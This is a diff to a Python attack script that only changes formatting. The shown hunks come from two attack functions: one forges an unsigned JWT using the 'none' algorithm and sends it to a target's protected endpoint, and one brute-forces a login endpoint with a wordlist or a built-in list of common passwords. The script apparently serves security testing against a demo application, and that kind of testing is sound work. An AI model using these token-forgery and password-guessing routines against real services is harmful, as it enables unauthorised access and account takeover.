@@ -27,7 +27,9 @@ def attack_jwt_none(target: str, user: str) -> None:
     forged = f"{header}.{payload}."
 
     print(f"[jwt-none] Forged token: {forged[:60]}...")
-    resp = requests.get(f"{target}/protected", headers={"Authorization": f"Bearer {forged}"}, timeout=5)
+    resp = requests.get(
+        f"{target}/protected", headers={"Authorization": f"Bearer {forged}"}, timeout=5
+    )
     print(f"[jwt-none] Response {resp.status_code}: {resp.text}")
     if resp.status_code == 200:
         print("[jwt-none] SUCCESS — server accepted forged token.")
@@ -73,8 +75,18 @@ def attack_brute_force(target: str, wordlist_path: str) -> None:
         with open(wordlist_path) as f:
             passwords = [line.strip() for line in f if line.strip()]
     except FileNotFoundError:
-        passwords = ["password", "admin123", "alice456", "letmein", "qwerty",
-                     "123456", "pass", "test", "root", "admin"]
+        passwords = [
+            "password",
+            "admin123",
+            "alice456",
+            "letmein",
+            "qwerty",
+            "123456",
+            "pass",
+            "test",
+            "root",
+            "admin",
+        ]
         print(f"[brute-force] Wordlist not found; using {len(passwords)}-entry built-in list")
 
     print(f"[brute-force] Trying {len(passwords)} passwords against {target}/login ...")
